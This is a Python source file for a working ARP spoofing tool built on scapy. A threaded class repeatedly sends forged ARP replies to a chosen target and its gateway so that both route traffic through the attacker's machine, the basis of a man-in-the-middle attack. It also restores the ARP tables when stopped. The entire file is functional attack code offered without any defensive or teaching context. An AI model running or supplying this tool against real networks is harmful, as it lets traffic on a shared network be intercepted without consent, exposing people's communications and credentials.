import threading
import scapy.all as scapy
import time


class ArpSpoofing(threading.Thread):
    def __init__(self, target, gateway):
        threading.Thread.__init__(self)
        self.target = target
        self.gateway = gateway
        self.restore_flag = threading.Event()

    # Get target mac address using ip address
    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        while True:
            # NOTE: the timeout value has to be large in bad network
            answered_list = scapy.srp(arp_request_broadcast, timeout=5,
                                      verbose=False)[0]
            if len(answered_list) > 0:
                break
        return answered_list[0][1].hwsrc

    # Change mac address in arp table
    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                           psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    # Restore mac address in arp table
    def restore(self, dest_ip, source_ip):
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                           psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

    def run(self):
        sent_packets_count = 0
        while not self.restore_flag.is_set():
            self.spoof(self.target, self.gateway)
            self.spoof(self.gateway, self.target)
            sent_packets_count += 2
            print(
                f"\r[+] ARP Poisoning packets sent: {sent_packets_count}", end="")
            time.sleep(2)

        print("\nReseting ARP tables. Please wait.")
        self.restore(self.target, self.gateway)
        self.restore(self.gateway, self.target)
        print("\nARP table restored.")
